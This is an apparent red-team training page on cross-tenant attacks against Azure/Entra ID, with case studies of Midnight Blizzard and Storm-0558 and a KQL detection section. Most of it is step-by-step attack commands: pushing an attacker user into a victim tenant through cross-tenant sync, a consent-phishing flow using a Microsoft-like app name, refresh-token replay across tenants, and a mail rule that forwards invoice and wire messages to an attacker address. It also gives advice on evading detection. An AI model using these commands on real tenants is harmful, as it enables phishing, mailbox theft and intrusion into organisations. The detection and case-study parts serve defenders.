---
layout: training-page
title: "Cross-Tenant Azure Attacks — Red Team Academy"
module: "Red Team Tools"
tags:
  - azure
  - entra-id
  - cross-tenant
  - b2b
  - cts
  - graph-api
  - cloud
page_key: "cloud-cross-tenant-azure"
render_with_liquid: false
---

# Cross-Tenant Azure Attacks

Cross-tenant attacks are the defining Azure red team class of 2024–2026. In January 2024 Microsoft's own MSTIC team disclosed that Midnight Blizzard (Nobelium / APT29 / SVR) compromised Microsoft corporate mailboxes by first password-spraying a **legacy non-production test tenant**, abusing a pre-existing OAuth application that had elevated access into the corporate (production) Microsoft tenant, then minting tokens with `full_access_as_app` and `Mail.Read` against Exchange Online. The pivot was not a vulnerability — it was a *trust relationship* between two tenants that nobody had inventoried. Every multi-tenant SaaS vendor, every M&A integration, every B2B partner, every CTS-linked subsidiary is now a potential pre-positioned foothold. The "external identity becomes internal" problem is the new "domain trust" problem, and the tooling to attack it (ROADtools, AADInternals, GraphRunner, TokenTactics, BARK) has matured faster than most blue teams' detection coverage.

This page covers the four cross-tenant trust models, Cross-Tenant Access Policy (CTAP) bypass, Vectra-class CTS abuse, multi-tenant app consent grant abuse, refresh token cross-tenant replay, guest privilege escalation, the Storm-0558 / Midnight Blizzard case study, the tooling, and the detection surface a red teamer should expect to trip.

## Cross-Tenant Models — What You're Actually Attacking

There are four distinct cross-tenant surfaces in Entra ID. Each has its own trust model, its own enumeration path, and its own abuse primitive. Most defenders only understand the first one (guests). The others are where the real money is.

```
1. B2B Collaboration         — guest user object in target tenant, home tenant issues the token
2. B2B Direct Connect        — Teams shared channels, mutual trust handshake, no guest object
3. Cross-Tenant Sync (CTS)   — automated user provisioning from one tenant INTO another
4. Multi-tenant Enterprise   — single app registration consumed by many tenants via consent
   Applications                 (the Midnight Blizzard / Storm-0558 attack class)
```

| Model | Direction | Object created in target? | Token issuer | Conditional Access applies? | Primary abuse |
|-------|-----------|--------------------------|--------------|----------------------------|---------------|
| B2B Collaboration | Inbound guest | Yes (guest user) | Home tenant | Target tenant CA + inbound CTAP | Default guest perms, invite redemption hijack |
| B2B Direct Connect | Bidirectional | No object | Home tenant | Both tenants' CTAP must allow | Shared channel data exfil, MFA-trust bypass |
| Cross-Tenant Sync | Inbound member | Yes (full member!) | Home tenant after sync | Target tenant CA applies; inbound CTAP must allow | Push attacker user as internal member (Vectra class) |
| Multi-tenant App | App identity | Service principal | Home tenant of app | Conditional Access on app, NOT on user | Illicit consent, refresh token harvest, Storm-0558-style |

The critical distinction: in models 3 and 4, an attacker's identity becomes **internal** to the target tenant from the perspective of most controls. CTS-synced users are members, not guests. Multi-tenant app service principals are first-class principals in the target directory. "External" stops being a useful filter.

```
# Quick tenant fingerprint — anonymous, no auth, just a domain
curl -s "https://login.microsoftonline.com/contoso.com/.well-known/openid-configuration" | jq .
# Returns issuer URL containing the tenant ID — confirms tenant exists

# Discover federation realm
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@contoso.com&xml=1"
# Returns: NameSpaceType (Managed | Federated), FederationBrandName, AuthURL

# AADInternals one-liner — tenant ID, branding, MX, MDI, sync status
Import-Module AADInternals
Get-AADIntTenantDomains -Domain contoso.com
Get-AADIntLoginInformation -UserName user@contoso.com
Invoke-AADIntReconAsOutsider -DomainName contoso.com
# Returns: tenant ID, brand, MX, SPF, DMARC, MDI instance, DesktopSSO,
#          domain federation type, sync server (if AAD Connect leaks it)
```

## Cross-Tenant Access Policy (CTAP) Bypass

CTAP is the modern replacement for the legacy "external collaboration settings." It defines, **per partner tenant**, inbound and outbound rules for users, groups, apps, and trust signals (MFA trust, compliant device trust, hybrid-joined device trust). The default `00000000-0000-0000-0000-000000000000` policy applies to any tenant not explicitly configured — and the factory default is *allow everything inbound for B2B*.

```
# Read your OWN tenant's CTAP defaults (requires Security Reader or above)
# Graph beta endpoint
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/default"

# Read partner-specific configurations
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners"

# AADInternals — enumerate as an outsider when you already have a token in any tenant
Get-AADIntCrossTenantAccessPolicy
Get-AADIntCrossTenantAccessPolicyPartners
```

### The default-allow trap

Three settings cause most of the real-world cross-tenant compromises:

```
{
  "b2bCollaborationInbound": {
    "usersAndGroups":  { "accessType": "allowed", "targets": [{"target":"AllUsers"}] },
    "applications":    { "accessType": "allowed", "targets": [{"target":"AllApplications"}] }
  },
  "b2bDirectConnectInbound": {
    "usersAndGroups":  { "accessType": "blocked", ... },     // safer default
    "applications":    { "accessType": "blocked", ... }
  },
  "inboundTrust": {
    "isMfaAccepted":            true,    // accept home tenant's MFA claim
    "isCompliantDeviceAccepted": false,
    "isHybridAzureADJoinedDeviceAccepted": false
  }
}
```

`isMfaAccepted: true` is the silent killer. If the attacker compromises a user in tenant A (no MFA enforced there), then is invited as a guest to tenant B with `isMfaAccepted: true`, tenant B trusts tenant A's "I authenticated this user" claim — even when tenant A's authentication was a single weak password. CTAP MFA trust **outsources MFA enforcement to the partner**. Set up between organisations that don't have equivalent MFA hygiene, this collapses to no-MFA-in-the-weakest-link.

### Inbound trap — partner tenant pivots

```
# When you have access in tenant A and want to know which tenants you can reach as a guest
# (i.e. who has B2B inbound = allowed with tenant A)
# There is no native enumeration — but you can probe by attempting redemption against
# known partner tenants. AADInternals provides this:

Get-AADIntAccessTokenForAADGraph -SaveToCache
$tenants = Get-AADIntTenants  # tenants the current account is a guest in
foreach ($t in $tenants) {
  Write-Host "Reachable: $($t.DisplayName) — $($t.TenantId)"
}

# ROADrecon variant
roadrecon auth --device-code
roadrecon gather --all
# Then in the SQLite DB: SELECT * FROM Users WHERE userType = 'Guest';
# Each guest entry has externalUserState + creationType — find which tenants invited you in
```

### Sample CTAP policy that an attacker WANTS to find

```json
{
  "displayName": "Allow Partner Vendor",
  "tenantId": "11111111-1111-1111-1111-111111111111",
  "b2bCollaborationInbound": {
    "usersAndGroups": { "accessType": "allowed", "targets": [{"target":"AllUsers","targetType":"user"}] },
    "applications":   { "accessType": "allowed", "targets": [{"target":"AllApplications","targetType":"application"}] }
  },
  "inboundTrust": {
    "isMfaAccepted": true,
    "isCompliantDeviceAccepted": true,
    "isHybridAzureADJoinedDeviceAccepted": true
  },
  "automaticUserConsentSettings": {
    "inboundAllowed": true,
    "outboundAllowed": true
  }
}
```

`automaticUserConsentSettings.inboundAllowed: true` means CTS-pushed users **do not require** the target tenant to redeem an invitation. That's the next section.

## CTS Abuse — The Vectra Research Class

In June 2023 Vectra AI published "Achieving Lateral Movement With Cross-Tenant Synchronization" (Eric Saraga). The class is now treated as a baseline Azure red team primitive. The premise: if you compromise tenant A and tenant A has Cross-Tenant Synchronization configured with `Push` enabled toward tenant B, you can **push an attacker-controlled user identity into tenant B as a synced member object** — bypassing tenant B's guest invitation workflow entirely.

CTS was launched in 2023 for legitimate M&A and subsidiary use cases. The provisioning agent in the source tenant pushes users into a configured target tenant. The target tenant only sees a synced object arriving — it has no signal that the source tenant is compromised.

### Pre-requisites for the attack

```
In the SOURCE tenant (compromised — what you control):
  - Hybrid Identity Administrator OR Cloud Application Administrator
    (to create/modify the cross-tenant sync configuration)
  - Application Administrator on the AAD Provisioning app
  - A user account you can push (a normal cloud user is enough)

In the TARGET tenant (victim — what you're pushing into):
  - automaticUserConsentSettings.inboundAllowed = true   (CTS pre-consent)
  - b2bCollaborationInbound = allowed for your source tenant
  - A configured cross-tenant access policy partner entry pointing at your source tenant
```

### Identifying CTS-eligible peer tenants

```
# From INSIDE the source tenant — list configured CTS targets
Connect-AzureAD
Get-AzureADMSCrossTenantAccessPolicyConfigurationPartner

# Enumerate the AAD Provisioning service principal that does CTS
Get-AzureADServicePrincipal -Filter "displayName eq 'Azure AD Identity Provisioning'"

# Look for existing provisioning jobs (these point at partner tenants)
# Graph endpoint
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/servicePrincipals/<sp-id>/synchronization/jobs"

# Each job has a credentials.uri pointing at the partner tenant — that's your target
```

### Pushing a user into the target tenant

```
# Step 1 — create your throwaway user in the SOURCE tenant
$pwd = ConvertTo-SecureString -String "Tr0lD@rk0rc!" -AsPlainText -Force
New-AzureADUser -DisplayName "Service Account" `
  -UserPrincipalName "svc-mon@source-tenant.onmicrosoft.com" `
  -AccountEnabled $true `
  -PasswordProfile @{ Password = "Tr0lD@rk0rc!" }

# Step 2 — assign that user into the in-scope group for the CTS provisioning job
Add-AzureADGroupMember -ObjectId <cts-scope-group-id> -RefObjectId <new-user-object-id>

# Step 3 — trigger the sync (don't wait for the next 40-minute cycle)
$jobId = "<the synchronization job id from above>"
$spId  = "<the AAD Provisioning service principal id>"
Start-AzureADMSSyncJob -ObjectId $spId -JobId $jobId

# Within minutes the user appears in the TARGET tenant as a MEMBER (not a guest!)
# Confirm from the target side:
curl -H "Authorization: Bearer $TARGET_TOKEN" \
  "https://graph.microsoft.com/v1.0/users?\$filter=onPremisesSyncEnabled eq false and userType eq 'Member'"
```

### Why this bypasses conditional access

Once the synced user exists as a member in the target tenant, every authentication happens against the source tenant's identity provider — but the *resource access* in the target tenant evaluates against target-tenant Conditional Access policies that typically scope on `Member`/`Guest` and on group membership. The synced user is a Member. If the target tenant's "require MFA for guests" policy was the only inbound control, it doesn't fire. If `inboundTrust.isMfaAccepted: true`, the source tenant's (attacker-controlled) MFA claim is accepted blind.

### Provisioning agent abuse (variant)

If you can compromise the on-prem AAD Connect server (or its cloud equivalent, AAD Cloud Sync provisioning agent), you skip everything above — the agent already holds CTS credentials for any configured peer tenants. Dump the agent's bootstrap configuration; the secrets and tenant IDs are right there. Dirk-jan Mollema's "I'm in your cloud" research covers AAD Connect credential extraction in depth.

```
# ROADtools — once you have a refresh token for any account in source tenant
roadtx gettokens -r <refresh_token> --tenant <source_tenant_id> \
  -c 1b730954-1685-4b74-9bfd-dac224a7b894 \
  -r https://graph.microsoft.com

# Then drive CTS APIs directly via roadtx
roadtx grant <target_tenant_id>   # explicitly grant consent flow
```

## Multi-Tenant App Consent Grant Abuse

Multi-tenant Entra applications are the "OAuth illicit consent" pattern evolved for cross-tenant attack. Standard illicit consent: register an app in YOUR tenant, set it to multi-tenant, craft a consent URL, phish a target tenant user (or admin), and on consent your attacker-tenant service principal is granted scopes in the target tenant. The attacker now holds a refresh token that lives until the consent grant is revoked — months, sometimes years.

This is the technique APT29 / Midnight Blizzard / Nobelium has used repeatedly: in SolarWinds follow-on activity, in the 2021 Volexity-disclosed cases, and in variants of the 2024 Microsoft corporate compromise.

### The full attack flow

```
# 1. Register a multi-tenant app in attacker's own Entra tenant
az ad app create \
  --display-name "Microsoft Document Sharing Service" \
  --sign-in-audience AzureADMultipleOrgs \
  --web-redirect-uris https://attacker.com/callback

# 2. Add Microsoft Graph delegated permissions you want
# Get Graph SP appId (constant): 00000003-0000-0000-c000-000000000000
# Permission IDs you'd request (delegated):
#   Mail.Read                = 570282fd-fa5c-430d-a7fd-fc8dc98a9dca
#   Mail.ReadWrite           = 024d486e-b451-40bb-833d-3e66d98c5c73
#   MailboxSettings.ReadWrite= 818c620a-27a9-40bd-a6a5-d96f7d610b4b
#   Files.ReadWrite.All      = 863451e7-0667-486c-a5d6-d135439485f0
#   User.Read.All            = a154be20-db9c-4678-8ab7-66f6cc099a59
#   Directory.Read.All       = 06da0dbc-49e2-44d2-8312-53f166ab848a
#   offline_access           = 7427e0e9-2fba-42fe-b0c0-848c9e6a8182
# Mail.Read + offline_access is the *killer combo* — long-lived mailbox access

# 3. Craft the consent URL
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<your_malicious_app_id>
  &response_type=code
  &redirect_uri=https://attacker.com/callback
  &response_mode=query
  &scope=offline_access%20Mail.Read%20Files.Read.All%20User.Read.All
  &state=12345

# 4. Phish the target. The consent screen in 2026 is much louder than 2020
#    — "verified publisher" indicators, app branding, scope warnings.
#    Mitigations: register your app with a believable display name; if you can
#    abuse a verified publisher (compromised partner ISV), the warnings shrink.

# 5. On consent: target's browser is redirected to your callback with ?code=
#    Exchange the code for tokens against the TARGET tenant's token endpoint
curl -X POST "https://login.microsoftonline.com/<target_tenant_id>/oauth2/v2.0/token" \
  -d "client_id=<your_app_id>" \
  -d "client_secret=<your_app_secret>" \
  -d "code=<the_code>" \
  -d "redirect_uri=https://attacker.com/callback" \
  -d "grant_type=authorization_code"

# Returns: access_token (1h), refresh_token (90d sliding), id_token

# 6. Long-lived access via refresh
curl -X POST "https://login.microsoftonline.com/<target_tenant_id>/oauth2/v2.0/token" \
  -d "client_id=<your_app_id>" \
  -d "client_secret=<your_app_secret>" \
  -d "refresh_token=<the_refresh_token>" \
  -d "grant_type=refresh_token" \
  -d "scope=offline_access Mail.Read"

# 7. Pull mail
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=999&\$select=subject,from,receivedDateTime"

# 8. Mailbox rule for stealthy ongoing exfil (requires MailboxSettings.ReadWrite)
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"displayName":"Forward","sequence":1,"isEnabled":true,
       "conditions":{"subjectContains":["invoice","wire","contract"]},
       "actions":{"forwardTo":[{"emailAddress":{"address":"x@attacker.com"}}]}}' \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules"
```

### Admin consent vs user consent

`User.Read.All` and `Directory.Read.All` require **admin consent** — a regular user clicking will see "Need admin approval." That sometimes works in the attacker's favor: the admin-consent request appears in the admin's request queue and a busy admin who recognizes the (spoofed) display name might just approve. Otherwise, target delegated scopes that do not require admin consent (`Mail.Read`, `Files.Read.All`, `User.Read`, `offline_access`).

### AADInternals one-shot consent phish generator

```
Import-Module AADInternals
Invoke-AADIntConsentPhishing -ClientID <your_app_id> `
  -Scopes "Mail.Read offline_access" `
  -RedirectUri https://attacker.com/callback `
  -Tenant common
# Returns the phishing URL ready to send
```

## Graph API Refresh Token Theft & Cross-Tenant Movement

Entra ID tokens follow a hierarchy. Understanding it is the difference between getting a one-hour-expiring access token and getting persistent multi-tenant footholds.

```
Primary Refresh Token (PRT)
   ├── issued to Windows 10/11 cloud-joined or hybrid-joined devices on user sign-in
   ├── device-bound (encrypted to the TPM in most modern configs)
   └── used to mint refresh tokens for any FOCI client

Refresh Token (RT)
   ├── 90-day sliding window (default), survives password reset by default
   ├── bound to (client_id, resource, user, audience-tenant)
   └── can be redeemed at any tenant's token endpoint that the client is authorised for

Access Token (AT)
   ├── 60–90 min lifetime
   ├── bearer — anyone holding it is the user, for that audience
   └── tenant-scoped via tid claim
```

### FOCI — Family of Client IDs

Microsoft maintains a quiet list of "Family Of Client IDs" — first-party Microsoft client IDs that share refresh tokens. A refresh token issued to one FOCI client can be redeemed by any other FOCI client. The 2024 published list includes:

```
1b730954-1685-4b74-9bfd-dac224a7b894   Azure Active Directory PowerShell
1fec8e78-bce4-4aaf-ab1b-5451cc387264   Microsoft Teams
04b07795-8ddb-461a-bbee-02f9e1bf7b46   Microsoft Azure CLI
26a7ee05-5602-4d76-a7ba-eae8b7b67941   Windows Search
27922004-5251-4030-b22d-91ecd9a37ea4   Outlook Mobile
872cd9fa-d31f-45e0-9eab-6e460a02d1f1   Visual Studio
af124e86-4e96-4b9d-bb2d-de14b3a2b1f7   OneDrive iOS App
d3590ed6-52b3-4102-aeff-aad2292ab01c   Microsoft Office  (the big one)
```

`d3590ed6-52b3-4102-aeff-aad2292ab01c` (Microsoft Office) is the canonical attacker target because it is broadly consented across nearly every tenant — most refresh tokens for Office can be silently traded for Outlook / Teams / OneDrive / Azure CLI tokens with no further consent.

### TokenTactics workflow

```
# Clone TokenTacticsV2 (active fork, maintained 2024-2026)
git clone https://github.com/f-bader/TokenTacticsV2.git
Import-Module ./TokenTacticsV2/TokenTacticsV2.psd1

# Phase 1 — initial token via device-code flow phish
Get-AzureToken -Client MSGraph
# Prints user code + login URL. Send the URL to victim.
# After victim authenticates, $response holds access_token + refresh_token

# Phase 2 — refresh-token family swap
$rt = $response.refresh_token
Invoke-RefreshToMSGraphToken         -RefreshToken $rt
Invoke-RefreshToOutlookToken         -RefreshToken $rt
Invoke-RefreshToOfficeManagementToken -RefreshToken $rt
Invoke-RefreshToAzureCoreManagementToken -RefreshToken $rt
Invoke-RefreshToSharePointToken      -RefreshToken $rt -Tenant contoso

# Phase 3 — cross-tenant redemption
# If the user is a guest in tenant B, you can redeem the same RT against tenant B:
$rt = $response.refresh_token
Invoke-RefreshToMSGraphToken -RefreshToken $rt -Tenant <target_tenant_id>
# This is how a single compromised RT pivots across every tenant the user is invited to.
```

### Cross-tenant Graph traversal once you have a token

```
# Enumerate tenants the current user can access (the "tenants you're a guest in" list)
curl -H "Authorization: Bearer $AT" \
  "https://management.azure.com/tenants?api-version=2020-01-01"

# For each tenantId returned, redeem your refresh token against that tenant's token endpoint
for t in $(curl -s -H "Authorization: Bearer $AT" \
  "https://management.azure.com/tenants?api-version=2020-01-01" | jq -r '.value[].tenantId'); do
  echo "=== Tenant $t ==="
  curl -X POST "https://login.microsoftonline.com/$t/oauth2/v2.0/token" \
    -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
    -d "refresh_token=$RT" \
    -d "grant_type=refresh_token" \
    -d "scope=https://graph.microsoft.com/.default offline_access"
done
```

## Guest User Privilege Escalation

The most underestimated cross-tenant surface is plain B2B guests. Entra's default guest permission set (`a0b1b346-4d3e-4e8b-98f8-753987be4970`, "Guest user with restricted permissions") is more restrictive than it used to be, but many tenants run the legacy `2af84b1e-32c8-42b7-82bc-daa82404023b` ("same as member") setting, especially older tenants that never reconfigured after the 2020+ defaults shipped.

```
# What can a guest see by default in a modern tenant (limited)?
# - Own user object
# - Members of groups they belong to (only)
# - Cannot enumerate users, groups, devices, applications at large

# What can a guest see when "same as member" is set (legacy default)?
curl -H "Authorization: Bearer $GUEST_TOKEN" \
  "https://graph.microsoft.com/v1.0/users?\$top=999"
# Full directory enumeration, same as any member

# Check the target tenant's guest authorization policy
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/policies/authorizationPolicy"
# Look at guestUserRoleId:
# 10dae51f-b6af-4016-8d66-8c2a99b929b3 = User
# 2af84b1e-32c8-42b7-82bc-daa82404023b = Guest user (same as member capability)
# a0b1b346-4d3e-4e8b-98f8-753987be4970 = Guest user with restricted permissions
# 95e79109-95c0-4d8e-aee3-d01accf2d47b = User with restricted permissions
```

### Invitation redemption hijack

The guest invitation flow has a long-running subtle defect class: the invitation redemption URL contains an `inviteRedeemUrl` parameter and an opaque ticket. If that URL is intercepted (forwarded to a personal mailbox, leaked via a misconfigured ticketing system, sent to a typo'd email address), whoever clicks it first becomes the guest. This is not a CVE — it is the documented behavior — but it is a real exploitation primitive when an attacker can intercept email or when a target has aggressive auto-forwarding rules.

### Guest-to-member via app role assignments

A guest with no directory permissions, given app-role-assignment access to a multi-tenant app that has high Graph scopes, effectively executes API calls *as a member* via the app's permissions. Always check what app roles a guest can be assigned and what those apps can do downstream.

```
# What apps in the target tenant can a guest see / be assigned to?
curl -H "Authorization: Bearer $GUEST_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/appRoleAssignments"

# What scopes those apps have
curl -H "Authorization: Bearer $GUEST_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appRoles/any(c:c/value eq 'X')"
```

## Real-World Case Study — Midnight Blizzard / Storm-0558

Two distinct 2023–2024 incidents are essential reading for any Azure red teamer. Both are publicly disclosed by Microsoft.

### Midnight Blizzard (Nobelium / APT29 / SVR) — January 2024

Per Microsoft's MSTIC blog post "Midnight Blizzard: Guidance for responders on nation-state attack" (January 19, 2024) and the follow-up advisory (March 2024):

```
Step 1 — Initial access
   Password spray against a LEGACY NON-PRODUCTION TEST tenant.
   The test tenant had a single dormant account, MFA NOT enforced.

Step 2 — Discovery of cross-tenant trust
   Within the legacy tenant, attackers identified an OAuth application
   that had been granted ELEVATED ACCESS to the Microsoft CORPORATE tenant
   (specifically: 'full_access_as_app' on Exchange Online).
   This app existed for legitimate purposes years earlier and was not deprovisioned.

Step 3 — Cross-tenant token mint
   Using the OAuth application's credentials, the attackers created
   ADDITIONAL malicious OAuth applications in the legacy tenant, granted
   themselves admin consent, and minted access tokens against the
   corporate Exchange Online tenant.

Step 4 — Mailbox access
   Tokens with full_access_as_app + Mail.Read against Exchange Online
   allowed reading senior leadership mailboxes (security, legal,
   executive) without triggering MFA or user-visible sign-ins.

Step 5 — Source code & secret reading (follow-on disclosure, March 2024)
   Information found in exfiltrated emails included authentication secrets
   shared between Microsoft and customers, which were then used in attempts
   against source code repositories and internal systems.
```

The architectural lesson: a legacy tenant that nobody audited, holding an OAuth app that pointed at a high-trust tenant, was the same class of pivot as a stale on-prem service account with Domain Admin rights — except invisible to most asset inventories.

### Storm-0558 — June 2023

Per Microsoft's "Analysis of Storm-0558 techniques for unauthorized email access" (July 14, 2023, updated September 2023):

```
Storm-0558 (PRC-aligned, suspected espionage) obtained an inactive Microsoft
account (MSA) consumer signing key. Through what Microsoft described as a
combination of issues — a crash-dump that should not have included the key,
the dump being moved to a corporate (Internet-connected) debugging
environment, and a token validation flaw — Storm-0558 was able to forge
Azure AD tokens for ENTERPRISE customers using the consumer MSA key.

Result: forged tokens that Outlook Web Access accepted against
~25 organizations including US State Department and US Department of Commerce
mailboxes. The forged tokens were "valid" in the sense that signature
verification accepted them due to the validation flaw — even though the key
itself was a consumer key, not an enterprise key.
```

This is not a path most red teams can reproduce (you need a Microsoft-internal key), but the *class* — cross-tenant token validation flaws — is the threat model every multi-tenant SaaS now lives under. CVE-2023-36019 and related Microsoft advisories trace adjacent issues.

## Tools

```
# === ROADtools (Dirk-jan Mollema) — the toolkit for Entra red team ===
pipx install roadrecon roadtx
roadtx --help

# Auth via device code; saves .roadtools_auth in cwd
roadtx devicecode -c d3590ed6-52b3-4102-aeff-aad2292ab01c

# Full tenant gather to local SQLite
roadrecon gather --auth-file .roadtools_auth
roadrecon serve         # interactive web UI at http://127.0.0.1:5000

# Token interop (refresh-token family swap across FOCI clients)
roadtx refreshtokento -r <RT> -c <new_client_id> -r-resource <resource>

# Cross-tenant pivot — redeem against another tenant
roadtx refreshtokento -r <RT> --tenant <target_tenant_id> \
  -c 1b730954-1685-4b74-9bfd-dac224a7b894 \
  -r https://graph.microsoft.com

# === AADInternals (Nestori Syynimaa) — most comprehensive AAD toolkit ===
Install-Module AADInternals -Force
Import-Module AADInternals

# Outsider recon (no auth required)
Invoke-AADIntReconAsOutsider -DomainName contoso.com
Get-AADIntTenantDomains -Domain contoso.com

# Insider recon (token required)
Get-AADIntAccessTokenForAADGraph -SaveToCache
Invoke-AADIntReconAsInsider

# Consent phishing URL generation
Invoke-AADIntConsentPhishing -ClientID <app_id> -Scopes "Mail.Read offline_access"

# Cross-tenant access policy enumeration
Get-AADIntCrossTenantAccessPolicy
Get-AADIntCrossTenantAccessPolicyPartners

# === GraphRunner (dafthack / Beau Bullock — Black Hills) ===
git clone https://github.com/dafthack/GraphRunner.git
Import-Module ./GraphRunner/GraphRunner.ps1

Get-GraphTokens                               # device code auth
Invoke-GraphRecon -Tokens $tokens             # tenant recon via Graph
Invoke-DumpApps -Tokens $tokens               # enumerate consent grants
Invoke-DumpCAPS -Tokens $tokens               # dump conditional access policies
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "credentials"
Invoke-InjectOAuthApp -Tokens $tokens         # plant malicious OAuth app

# === TokenTacticsV2 (f-bader fork — actively maintained) ===
git clone https://github.com/f-bader/TokenTacticsV2.git
Import-Module ./TokenTacticsV2/TokenTacticsV2.psd1
Get-AzureToken -Client MSGraph                # device-code phish
Invoke-RefreshToOutlookToken -RefreshToken $rt
Invoke-RefreshToMSManageToken -RefreshToken $rt   # Intune access via refresh swap

# === BARK (SpecterOps — BloodHound Azure team) ===
git clone https://github.com/BloodHoundAD/BARK.git
Import-Module ./BARK/BARK.ps1

$creds = Get-MSGraphTokenWithUsernamePassword -Username u@t.com -Password p
New-AppRegOwnerOnServicePrincipal               # privilege escalation primitive
Get-AzureRMRoleAssignments -Token $arm_token
# BARK pairs with AzureHound -> BloodHound to graph cross-tenant escalation paths

# === AzureHound + BloodHound CE ===
azurehound -u user@tenant.com -p Pass --tenant <tenant_id> list -o azure.json
# Import into BloodHound CE — visualize cross-tenant edges:
#   "AZGuest"        — guest user in tenant
#   "AZAddMembers"   — group write that escalates
#   "AZMGGrantRole"  — Graph permission to grant directory roles
```

## Detection Surface

Cross-tenant attacks are loud in *the right log sources* — but the right sources are not all enabled by default and are not all in Sentinel by default. Expect competent blue teams to query:

```
# === Suspicious consent grants — APT29-class ===
AuditLogs
| where OperationName == "Consent to application"
| where TimeGenerated > ago(7d)
| extend appName = tostring(TargetResources[0].displayName)
| extend permissions = tostring(parse_json(tostring(TargetResources[0].modifiedProperties)))
| where permissions has_any ("Mail.Read","Mail.ReadWrite","MailboxSettings","Files.Read.All","offline_access")
| project TimeGenerated, InitiatedBy, appName, permissions

# === New multi-tenant app registration ===
AuditLogs
| where OperationName == "Add application"
| extend signInAudience = tostring(parse_json(tostring(TargetResources[0].modifiedProperties)))
| where signInAudience has "MultipleOrgs" or signInAudience has "AzureADMultipleOrgs"

# === CTS-class — synced user creation from a foreign tenant ===
AuditLogs
| where OperationName == "Add user"
| where TargetResources has "userType"
| extend creationType = tostring(parse_json(tostring(TargetResources[0].modifiedProperties)))
| where creationType has "EmailVerified" or creationType has "Invitation"

# === Sign-in from cross-tenant origin ===
SigninLogs
| where CrossTenantAccessType != "none"
| where CrossTenantAccessType has_any ("b2bCollaboration","b2bDirectConnect","passthrough","serviceProvider")
| project TimeGenerated, UserPrincipalName, AppDisplayName, CrossTenantAccessType, ResourceTenantId, HomeTenantId, IPAddress

# === Refresh-token replay across tenants ===
# Same refresh_token redeemed against multiple ResourceTenantIds in short window
SigninLogs
| where TokenIssuerType == "AzureAD"
| summarize tenants = make_set(ResourceTenantId), count() by UserPrincipalName, AppId, bin(TimeGenerated, 1h)
| where array_length(tenants) > 1

# === Conditional access "failure" on cross-tenant sign-in ===
SigninLogs
| where ConditionalAccessStatus == "failure"
| where CrossTenantAccessType != "none"

# === Anomalous OAuth app activity ===
AADRiskyServicePrincipals     // Defender for Cloud Apps detection table
| where RiskState == "atRisk"
```

A red teamer should expect Defender for Cloud Apps (formerly MCAS) to fire on:

- Newly added apps with high privileges
- Apps added by non-admin users (delegated consent at scale)
- Anomalous app activity (sudden mailbox enumeration via Graph from a previously-quiet SP)
- Sign-ins from unusual countries shortly after consent

Mitigation on the attacker side: pre-warm the OAuth app for 1-2 weeks of low-volume legitimate-looking activity before pivoting; use a verified publisher (legitimate compromised ISV) where possible; use a registered redirect URI on infrastructure aged at least 30 days.

## Resources

- **Microsoft MSTIC — Midnight Blizzard guidance (Jan 19, 2024)** — `microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/`
- **Microsoft MSRC — Storm-0558 technical analysis (Jul 14, 2023)** — `msrc.microsoft.com/blog/2023/07/microsoft-mitigates-china-based-threat-actor-storm-0558-targeting-of-customer-email/`
- **Microsoft MSTIC — Storm-0558 techniques deep dive** — `microsoft.com/en-us/security/blog/2023/07/14/analysis-of-storm-0558-techniques-for-unauthorized-email-access/`
- **Vectra AI — CTS abuse research (Eric Saraga, Jun 2023)** — `vectra.ai/blog/undocumented-azure-active-directory-back-door-allows-mfa-bypass`
- **Vectra AI — Cross-Tenant Synchronization attack primer** — `vectra.ai/blog/cross-tenant-synchronization-attack-research`
- **Dirk-jan Mollema — "I'm in your cloud" series** — `dirkjanm.io/talks/` and `dirkjanm.io/`
- **Dirk-jan Mollema — ROADtools documentation** — `github.com/dirkjanm/ROADtools`
- **AADInternals official docs (Nestori Syynimaa / Secureworks)** — `aadinternals.com/aadinternals/`
- **SpecterOps — "Azure Privilege Escalation via Service Principals"** — `posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5`
- **SpecterOps — BARK and AzureHound** — `github.com/BloodHoundAD/BARK` and `github.com/BloodHoundAD/AzureHound`
- **Black Hills — GraphRunner (Beau Bullock)** — `github.com/dafthack/GraphRunner`
- **TokenTacticsV2 (f-bader fork)** — `github.com/f-bader/TokenTacticsV2`
- **Microsoft — Cross-tenant access settings (official docs)** — `learn.microsoft.com/en-us/entra/external-id/cross-tenant-access-overview`
- **Microsoft — Cross-tenant synchronization** — `learn.microsoft.com/en-us/entra/identity/multi-tenant-organizations/cross-tenant-synchronization-overview`
- **MITRE ATT&CK T1550.001 — Application Access Token** — `attack.mitre.org/techniques/T1550/001/`
- **MITRE ATT&CK T1528 — Steal Application Access Token** — `attack.mitre.org/techniques/T1528/`
- **MITRE ATT&CK T1098.003 — Additional Cloud Roles** — `attack.mitre.org/techniques/T1098/003/`
